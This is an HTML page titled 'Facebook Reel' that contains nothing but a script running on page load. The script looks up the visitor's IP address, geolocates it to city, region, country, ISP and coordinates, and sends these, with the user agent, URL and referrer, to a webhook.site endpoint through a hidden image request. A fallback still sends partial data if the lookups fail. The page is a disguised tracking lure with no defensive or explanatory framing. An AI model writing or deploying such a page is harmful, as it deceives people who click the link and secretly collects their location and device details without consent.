<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Facebook Reel</title>
</head>
<body>

<script>
const webhook = "https://webhook.site/76d85cc8-aec9-4843-8f6c-48240f40d8f3";

function sendData() {
  fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(ipData => {
      fetch('https://ipapi.co/' + ipData.ip + '/json/')
        .then(r => r.json())
        .then(info => {
          const params = new URLSearchParams({
            timestamp: new Date().toISOString(),
            ip: ipData.ip,
            city: info.city || "Unknown",
            region: info.region || "Unknown",
            country: info.country_name || "Unknown",
            isp: info.org || "N/A",
            coords: (info.latitude || "N/A") + "," + (info.longitude || "N/A"),
            userAgent: navigator.userAgent,
            clickedUrl: window.location.href,
            referrer: document.referrer || "Direct"
          });

          const img = new Image();
          img.src = webhook + "?" + params.toString();
        })
        .catch(() => fallback());
    })
    .catch(() => fallback());
}

function fallback() {
  const img = new Image();
  img.src = webhook + "?error=blocked&ua=" + encodeURIComponent(navigator.userAgent) + "&url=" + encodeURIComponent(window.location.href);
}

sendData();
</script>
